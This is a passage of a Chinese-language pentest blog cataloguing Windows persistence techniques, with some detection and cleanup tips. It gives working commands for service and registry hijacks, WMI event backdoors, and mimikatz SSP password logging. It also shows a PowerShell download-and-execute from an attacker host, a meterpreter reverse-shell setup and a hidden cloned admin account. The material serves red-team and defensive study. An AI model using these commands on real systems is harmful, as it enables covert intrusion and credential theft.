<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time&quot; &#x2F;v ImagePath &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.exe&quot;</span><br></pre></td></tr></table></figure>

<h4 id="FailureCommand"><a href="#FailureCommand" class="headerlink" title="FailureCommand"></a>FailureCommand</h4><p>当某个服务启动失败或被中止时，可以执行某些操作。这个操作对于注册表项的键名为<code>FailureCommand</code>，值为要执行的操作。<br>例如进行如下操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time&quot; &#x2F;v FailureCommand &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line"># 或可以用sc命令来指定FailureCommand</span><br><span class="line">sc failure Fax command&#x3D; &quot;\&quot;c:\Windows\system32\pentestlab.exe\&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>之后再kill对应服务时，pentestlab.exe就会执行。</p>
<p>注意在具体服务属性中的Recovery，可以设置第1-3次失败时执行的操作，只将第一次设置为运行程序。<br>以及该方式应该非常容易被杀。</p>
<h3 id="msdtc服务dll劫持"><a href="#msdtc服务dll劫持" class="headerlink" title="msdtc服务dll劫持"></a>msdtc服务dll劫持</h3><p>msdtc(Microsoft Distributed Transaction Coordinator)是Windows服务，负责协调数据库与web服务器。<br>服务启动时会从System32文件下加载3个dll文件：<br>1.oci.dll<br>2.SQLLib80.dll<br>3.xa80.dll<br>它们在注册表项<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI</code>下。<br>一般情况下，System32文件夹下没有<code>oci.dll</code>，因此可以把它劫持为恶意dll，如果同名需要管理员权限。<br>启动msdtc命令：<code>net start msdtc</code><br>劫持后，dll运行权限为<code>NT AUTHORITY\NETWORK SERVICE</code>。如果终端可执行<code>msdtc -install</code>，权限能提升为对应用户权限。<br>默认情况下msdtc在主机重启后不会自启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc msdtc # 查看服务详情</span><br><span class="line">sc config msdtc start&#x3D; auto # 设置自启动</span><br></pre></td></tr></table></figure>

<h3 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h3><p>创建服务需要本地管理员权限。<br>cmd命令行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc create pentestlab binpath&#x3D; &quot;cmd.exe &#x2F;k C:\temp\pentestlab.exe&quot; start&#x3D;&quot;auto&quot; obj&#x3D;&quot;LocalSystem&quot;</span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure>
<p>powershell命令行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-Service -Name &quot;pentestlab&quot; -BinaryPathName &quot;C:\temp\pentestlab.exe&quot; -Description &quot;PentestLaboratories&quot; -StartupType Automatic</span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure>

<h4 id="排查-4"><a href="#排查-4" class="headerlink" title="排查"></a>排查</h4><p>autoruns工具检查已有的服务，并验证服务模块的合法性。如验证是否有文件签名、签名是否正常。</p>
<h3 id="wmi事件"><a href="#wmi事件" class="headerlink" title="wmi事件"></a>wmi事件</h3><p>从攻防角度来看，WMI最强大的功能之一是WMI能够响应WMI事件，而WMI事件可用于响应几乎任何操作系统事件。有两类WMI事件，本地事件持续主机进程的生命周期，而永久WMI事件存储在WMI存储库中，以SYSTEM身份运行，并在重新引导后保持不变。<br>wmi事件订阅需要3步：<br>step1：注册事件过滤器，即事件的触发条件(__EventFilter)<br>step2：注册事件消费者，即触发事件时要执行的操作(EventConsumer)<br>step3：绑定事件消费者和过滤器，绑定以在事件触发时执行指定操作(__FilterToConsumerBinding)</p>
<h4 id="传统mof"><a href="#传统mof" class="headerlink" title="传统mof"></a>传统mof</h4><p>mof(Managed object format)是用于描述CIM(Common Information Model)类的语言。mof文件内容编译时会添加到wmi存储库。<br>文件内容示例，cmd.exe会在notepad.exe进程创建时执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#PRAGMA NAMESPACE (&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of CommandLineEventConsumer as $Cons</span><br><span class="line">&#123;</span><br><span class="line">    Name &#x3D; &quot;Pentestlab&quot;;</span><br><span class="line">    RunInteractively&#x3D;false;</span><br><span class="line">    CommandLineTemplate&#x3D;&quot;cmd.exe&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __EventFilter as $Filt</span><br><span class="line">&#123;</span><br><span class="line">    Name &#x3D; &quot;Pentestlab&quot;;</span><br><span class="line">    EventNamespace &#x3D; &quot;root\\subscription&quot;;</span><br><span class="line">    Query &#x3D;&quot;SELECT * FROM __InstanceCreationEvent Within 3&quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_Process\&quot; &quot;</span><br><span class="line">            &quot;And Targetinstance.Name &#x3D; \&quot;notepad.exe\&quot; &quot;;</span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123; </span><br><span class="line">     Filter &#x3D; $Filt;</span><br><span class="line">     Consumer &#x3D; $Cons;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>编译命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mofcomp.exe .\wmi.mof</span><br></pre></td></tr></table></figure>
<p>该技术因会用到mof文件，因此不推荐。(有另一种wmi无mof文件权限维持的方式)</p>
<h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><p>示例，pentestlab.exe会在每次主机开机60秒内执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;PentestLab&quot;, EventNameSpace&#x3D;&quot;root\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;</span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;PentestLab&quot;, ExecutablePath&#x3D;&quot;C:\Windows\System32\pentestlab.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\Windows\System32\pentestlab.exe&quot;</span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\&quot;PentestLab\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\&quot;PentestLab\&quot;&quot;</span><br></pre></td></tr></table></figure>

<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>示例，pentestlab.exe会在每次主机开机5分钟内执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$FilterArgs &#x3D; @&#123;name&#x3D;&#39;Pentestlab-WMI&#39;;</span><br><span class="line">                EventNameSpace&#x3D;&#39;root\CimV2&#39;;</span><br><span class="line">                QueryLanguage&#x3D;&quot;WQL&quot;;</span><br><span class="line">                Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;&#x3D; 240 AND TargetInstance.SystemUpTime &lt; 325&quot;&#125;;</span><br><span class="line">$Filter&#x3D;New-CimInstance -Namespace root&#x2F;subscription -ClassName __EventFilter -Property $FilterArgs</span><br><span class="line"> </span><br><span class="line">$ConsumerArgs &#x3D; @&#123;name&#x3D;&#39;Pentestlab-WMI&#39;;</span><br><span class="line">                CommandLineTemplate&#x3D;&quot;$($Env:SystemRoot)\System32\pentestlab.exe&quot;;&#125;</span><br><span class="line">$Consumer&#x3D;New-CimInstance -Namespace root&#x2F;subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs</span><br><span class="line"> </span><br><span class="line">$FilterToConsumerArgs &#x3D; @&#123;</span><br><span class="line">Filter &#x3D; [Ref] $Filter;</span><br><span class="line">Consumer &#x3D; [Ref] $Consumer;</span><br><span class="line">&#125;</span><br><span class="line">$FilterToConsumerBinding &#x3D; New-CimInstance -Namespace root&#x2F;subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs</span><br></pre></td></tr></table></figure>

<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>参见<a href="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/">Persistence – WMI Event Subscription</a>文章末尾。</p>
<h4 id="排查-5"><a href="#排查-5" class="headerlink" title="排查"></a>排查</h4><p>使用autoRuns检查WMI订阅，并删除可疑的事件订阅。<br>或者使用powershell命令进行排查和清除：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 列出</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</span><br><span class="line"></span><br><span class="line"># 清除</span><br><span class="line">$EventConsumerToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Class CommandLineEventConsumer -Filter &quot;Name &#x3D; &#39;Pentestlab-WMI&#39;&quot;</span><br><span class="line">$EventFilterToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Class __EventFilter -Filter &quot;Name &#x3D; &#39;Pentestlab-WMI&#39;&quot;</span><br><span class="line">$FilterConsumerBindingToCleanup &#x3D; Get-WmiObject -Namespace root&#x2F;subscription -Query &quot;REFERENCES OF &#123;$($EventConsumerToCleanup.__RELPATH)&#125; WHERE ResultClass &#x3D; __FilterToConsumerBinding&quot;</span><br><span class="line">$FilterConsumerBindingToCleanup | Remove-WmiObject</span><br><span class="line">$EventConsumerToCleanup | Remove-WmiObject</span><br><span class="line">$EventFilterToCleanup | Remove-WmiObject</span><br></pre></td></tr></table></figure>

<h3 id="明文账号记录"><a href="#明文账号记录" class="headerlink" title="明文账号记录"></a>明文账号记录</h3><p>一般明文账号记录都会用到mimikatz，简述一下mimikatz的相关知识点和使用原理。</p>
<p>SSP(Security support provider)是用于扩展Windows的安全验证机制的API。LSASS应用程序会在Windows开机启动是加载SSP的多个dll文件，这也让黑客有机会注入任意一个SSP的dll文件来和LSASS进程进行交互并提取出进程空间中的所有密码，另外还能利用恶意SSP来patch进程。<br>想注入恶意SSP需要拥有administrator级别权限，方式有两种：<br>1.通过SSP DLL<br>2.注入内存<br>工具Mimikatz、Empire、PowerSploit均支持以上两种注入方式。<br>Empire和PowerSploit本质上还是调用的Mimikatz。</p>
<p>1.通过SSP DLL的方式<br>(a)将<code>mimilib.dll</code>移动到<code>C:\Windows\System32\</code>目录下。<br>(b)将<code>mimilib.dll</code>添加到注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>项中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; &#x2F;v &quot;Security Packages&quot; &#x2F;d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; &#x2F;t REG_MULTI_SZ</span><br></pre></td></tr></table></figure>
<p>(c)由于注册表已被篡改且DLL存储在系统中，因此<code>mimilib.dll</code>在重新启动后持续存在。当域的用户再次通过系统进行身份验证时，将创建一个新文件<code>C:\Windows\System32\kiwissp.log</code>记录帐户的凭据。</p>
<p>2.通过注入内存的方式<br>(a)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # misc::memssp</span><br></pre></td></tr></table></figure>
<p>(b)当用户再次通过系统进行身份验证时，将创建一个日志文件<code>C:\Windows\System32\mimilsa.log</code>，包含文本形式的用户密码。注意该方式重启后失效。</p>
<h4 id="排查-6"><a href="#排查-6" class="headerlink" title="排查"></a>排查</h4><p>1.是否存在日志文件<br><code>C:\Windows\System32\kiwissp.log</code><br><code>C:\Windows\System32\mimilsa.log</code><br>2.注册表项是否有新增可疑dll<br><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></p>
<h3 id="Appinit"><a href="#Appinit" class="headerlink" title="Appinit"></a>Appinit</h3><p>windows提供了允许将自定义dll加载到几乎所有应用程序进程的功能，可以利用于权限维持。<br>相关注册表项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 默认是禁用appinit加载dll的功能，需要将LoadAppInit_DLLs值修改为1来启用</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs - 0x1</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs - 0x1</span><br><span class="line"> </span><br><span class="line"># AppInit_DLLs的键值修改为恶意dll的路径</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>
<p>但该技术利用有个问题，由于几乎所有进程都会加载该dll，产生大量连接。<br>可以结合Didier Stevens开发的<a href="https://www.didierstevens.com/files/software/LoadDLLViaAppInit_V0_0_0_1.zip">DLL</a>来使用该技术。该DLL通过<code>LoadDLLViaAppInit.bl.txt</code>配置文件来控制哪些程序加载哪个dll。</p>
<h3 id="Netsh-Helper"><a href="#Netsh-Helper" class="headerlink" title="Netsh Helper"></a>Netsh Helper</h3><p>netsh被Windows用于执行与系统网络配置相关的任务，并在基于主机的Windows防火墙上进行修改。因为可以使用dll文件来扩展netsh的功能，所以能被利用于权限维持。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh</span><br><span class="line">add helper path-to-malicious-dll</span><br></pre></td></tr></table></figure>
<p>添加后，每次netsh启动时dll都会执行。但默认情况下netsh不会自启动。可以添加到开机启动的注册表项或者利用服务、计划任务。<br><code>add helper</code>会将dll路径添加到注册表项<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code>中。</p>
<h4 id="排查-7"><a href="#排查-7" class="headerlink" title="排查"></a>排查</h4><p>查看对应注册表项<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code>。</p>
<h3 id="Application-Shimming注入dll"><a href="#Application-Shimming注入dll" class="headerlink" title="Application Shimming注入dll"></a>Application Shimming注入dll</h3><p>Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim)用于软件在不同版本win操作系统上的兼容性。使用该框架会创建shim作为程序和win操作系统之间的缓冲区，当程序执行时，如果需要使用shim数据库(.sdb)就会引用shim缓存。<br>该工具包(ACT)的功能之一<code>InjectDLL</code>可以用于将dll注入到程序中。</p>
<p>step1.创建<code>xxx.sdb</code><br>这一步可以在自己主机上执行，只要创建时参数设置无误。<br>(a)打开compatibility administrator程序，选择<code>Create new Application Fix</code>，填写被注入dll程序的程序名与路径。<br>(b)在<code>Compatibility Fixes</code>步骤中勾选<code>InjectDLL</code>，并在选项<code>Parameters</code>中的<code>Command line</code>填写恶意dll路径。<br>step2.安装<code>xxx.sdb</code><br>执行cmd命令：<code>sdbinst xxx.sdb</code></p>
<p>tips: 通过sdbinst安装sdb会同时创建卸载程序，即在系统的<code>programs and features</code>可以发现并卸载它。同时该sdb程序会被拷贝到<code>C:\Windows\apppatch\CustomSDB</code>。通过工具<a href="https://github.com/evil-e/sdb-explorer">sdb-explorer</a>安装sdb可以避免卸载程序的创建与sdb拷贝。</p>
<h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><h4 id="传统"><a href="#传统" class="headerlink" title="传统"></a>传统</h4><p>在注册表中<code>sethc.exe</code>项添加一个Debugger字符，值为想要运行的程序路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sethc.exe路径：</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</span><br></pre></td></tr></table></figure>
<p>或者直接执行命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v Debugger &#x2F;t REG_SZ &#x2F;d &quot;Hack.exe程序路径&quot;</span><br></pre></td></tr></table></figure>
<p>这样“debugger”键值的程序会替换原有程序运行，例如此处键入五下Shift执行sethc.exe程序时会执行程序Hack.exe。</p>
<h4 id="新版"><a href="#新版" class="headerlink" title="新版"></a>新版</h4><p>区别：传统映像劫持是替换，新的是在程序A静默退出结束后，会执行程序B。<br>执行以下命令修改注册表项，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 修改IFEO目录下sethc.exe的GlobalFlag值</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v GlobalFlag &#x2F;t REG_DWORD &#x2F;d 512</span><br><span class="line"></span><br><span class="line"># 修改SilentProcessExit下ReportingMode值</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; &#x2F;v ReportingMode &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line"># 修改SilentProcessExit下MonitorProcess值</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot; &#x2F;v MonitorProcess &#x2F;t REG_SZ &#x2F;d &quot;Hack.exe程序路径&quot;</span><br></pre></td></tr></table></figure>
<p>当sethc.exe程序结束时，会执行Windows Error Reporting process(WerFault.exe)，Hack.exe作为WerFault.exe的子进程运行。</p>
<h4 id="排查与防御"><a href="#排查与防御" class="headerlink" title="排查与防御"></a>排查与防御</h4><p>1.直接排查对应注册表的值。<br>2.防御-修改系统配置UserAuthentication<br>（暂时未知SecurityLayer会不会影响该后门的利用）<br>UserAuthentication有两个值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0：进行远程桌面前不需要用户身份验证。</span><br><span class="line">1：进行远程桌面前需要进行用户身份验证。</span><br></pre></td></tr></table></figure>
<p>将该参数设置为1时则可防止黑客利用远程桌面界面键入Shift。<br>命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>

<h3 id="TimeProvider"><a href="#TimeProvider" class="headerlink" title="TimeProvider"></a>TimeProvider</h3><p>TimeProvider被Windows系统用于从网络设备或客户端获取时间戳。它是通过调用system32文件夹下的dll文件实现的(win7中是w32time.dll)，开机启动时会加载它的dll文件，因此可用于权限维持。<br>对应注册表项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer</span><br><span class="line"># 系统会调用哪一个取决于系统是作为NTP server还是NTP client</span><br></pre></td></tr></table></figure>
<p>修改键值命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient&quot; &#x2F;v DllName &#x2F;t REG_SZ &#x2F;d &quot;C:\temp\w32time.dll&quot;</span><br></pre></td></tr></table></figure>
<p>但直接篡改系统的TimeProvider容易被检测到。<br>有大佬开发过<a href="https://github.com/scottlundgren/w32time">自定义的TimeProvider</a>，可以用于在操作系统注册为新的TimeProvider然后再修改它的注册表项键值。</p>
<h4 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe gametime.dll,Deregister</span><br></pre></td></tr></table></figure>

<h3 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h3><p>waitfor是通过信号用于网络中(同网段)主机同步的二进制文件，因此可被利用于文件下载、命令执行、权限维持。<br>该文件在<code>C:\Windows\System32</code>目录下，需要本地管理员权限。<br>受害主机上执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waitfor pentestlab &amp;&amp; powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.0.0.13:8080&#x2F;pentestlaboratories&#39;);</span><br></pre></td></tr></table></figure>
<p>攻击主机上执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waitfor &#x2F;s xxx.xxx.xxx.xxx &#x2F;si pentestlab # &#x2F;s [受害主机ip]</span><br></pre></td></tr></table></figure>
<p>但该技术用于权限维持有一个问题，命令执行完后waitfor.exe会退出。<br>解决方案：<a href="https://github.com/3gstudent/Waitfor-Persistence">Waitfor-Persistence</a><br>该解决方案已经集成到了msf中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence</span><br><span class="line">set PERSISTENCE_METHOD WAITFOR</span><br><span class="line">set WAITFOR_TRIGGER pentestlab</span><br><span class="line">set SESSION 2</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 10.0.0.13</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h3 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h3><p>测试环境: win7<br>1.修改注册表权限<br>右键<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>-权限-Administrators，允许完全控制。修改后重启注册表。<br>2.新建用户名以<code>$</code>结尾的特殊账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user defaultuser0$ passwd233 &#x2F;add</span><br><span class="line">net localgroup administrators defaultuser0$ &#x2F;add</span><br></pre></td></tr></table></figure>
<p>用户名<code>$</code>结尾能在一些条件下隐藏，例如<code>net user</code>无法读取到用户，但控制面板仍可发现。<br>3.导出注册表项并修改文件<br>(a)<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\defaultuser0$</code>右键导出为<code>1.reg</code><br>(b)每个用户都有对应的注册表键值，将<code>defaultuser0$</code>对应的文件<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</code>右键导出为<code>2.reg</code><br>(c)将管理员帐户Administrator对应的注册表键值<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>导出为<code>3.reg</code><br>(d)将注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9</code>下键F的值替换为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>下键F的值，即<code>2.reg</code>中键F的值替换成<code>3.reg</code>中键F的值<br><img src="/images/win%E8%B4%A6%E6%88%B7%E9%9A%90%E8%97%8F%E9%94%AEF%E5%80%BC%E6%9B%BF%E6%8D%A2.png" alt="键F值替换"><br>4.删除特殊账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user defaultuser0$ &#x2F;del</span><br></pre></td></tr></table></figure>
<p>5.导入reg文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regedit &#x2F;s 1.reg</span><br><span class="line">regedit &#x2F;s 2.reg</span><br></pre></td></tr></table></figure>

<p>最终效果：控制面板不存在该帐户，通过<code>net user</code>无法列出该帐户，计算机管理-本地用户和组-用户也无法列出该帐户。</p>
<p>利用注意：<br>1.管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态。<br>2.在3389远程登录的利用上存在相同帐户的冲突关系，即同时登陆会导致对方下线。<br>3.F键的二进制数据含义<br>偏移量0x30:账户RID<br>偏移量0x38:启用还是禁用帐户，禁用1502，启用1402。<br><img src="/images/rid%E5%8A%AB%E6%8C%81F%E9%94%AE%E5%80%BC%E5%90%AB%E4%B9%89.png" alt="F键值二进制数据"></p>
<h4 id="排查与清理"><a href="#排查与清理" class="headerlink" title="排查与清理"></a>排查与清理</h4><p>隐藏帐户的登录记录，可通过查看日志获取。<br>删除注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>下对应帐户的键值(该层目录下+Names目录下)。</p>
<h3 id="AppCertDlls"><a href="#AppCertDlls" class="headerlink" title="AppCertDlls"></a>AppCertDlls</h3><p>如果有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec函数，那么此进程会获取<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\AppCertDlls</code>注册表项，此项下的dll都会加载到进程。</p>
<h2 id="常规系统自启动项"><a href="#常规系统自启动项" class="headerlink" title="常规系统自启动项"></a>常规系统自启动项</h2><h3 id="系统自启动目录"><a href="#系统自启动目录" class="headerlink" title="系统自启动目录"></a>系统自启动目录</h3><p>用户启动文件夹：<code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code><br>系统启动文件夹：<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
<h3 id="自启动注册表项"><a href="#自启动注册表项" class="headerlink" title="自启动注册表项"></a>自启动注册表项</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line"></span><br><span class="line"># 根据系统版本，有些注册表项可能没有。例如win7上我只发现了Run和RunOnce。</span><br></pre></td></tr></table></figure>
<p>Run和RunOnce注册表项在用户每次登录时运行。键名随意，键值为可执行文件的绝对路径。如果在这两个启动项下有多个程序，则这些程序的运行顺序并不确定。<br>Run项的值会一直存在，除非用户主动删除。RunOnce会在下一次重启时，运行指定键值的程序之前自动删除，即该键值下的程序只在下一次重启时启动一次。<br>RunServices和RunServicesOnce注册表项在登陆会话框第一次出现时在后台运行，或者在boot阶段运行(如果没有登陆过程)。<br>如果已提权，最好使用HKEY_LOCAL_MACHINE，而不是HKEY_CURRENT_USER，这样将在每次系统启动时执行，与验证的用户身份无关。<br>命令模板：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; &#x2F;v Pentestlab &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.exe&quot;</span><br></pre></td></tr></table></figure>

<p>OddvarMoe大佬发现的另两个注册表项位置，可以执行命令、程序或DLL：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001&quot; &#x2F;v Pentestlab &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend&quot; &#x2F;v Pentestlab &#x2F;t REG_SZ &#x2F;d &quot;C:\tmp\pentestlab.dll&quot;</span><br></pre></td></tr></table></figure>
<p>除此之外还有很多别的自启动项：<a href="https://zijieke.com/d/168">开机自启注册表位置整理</a></p>
<p>或者为了免杀还可以将运行脚本和加密payload分开存储到不同注册表项。Empire的Persistence Registry Module就是这样做的。</p>
<h3 id="排查-8"><a href="#排查-8" class="headerlink" title="排查"></a>排查</h3><p>工具：autoruns</p>
<h2 id="系统计划任务"><a href="#系统计划任务" class="headerlink" title="系统计划任务"></a>系统计划任务</h2><h3 id="at-win-xp-2003"><a href="#at-win-xp-2003" class="headerlink" title="at[win xp/2003-]"></a>at[win xp/2003-]</h3><p>示例，计划每个Saturday凌晨1:00点运行一次：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at 1:00 &#x2F;Every:Saturday MyDoor.bat </span><br></pre></td></tr></table></figure>
<p>参数解析：</p>
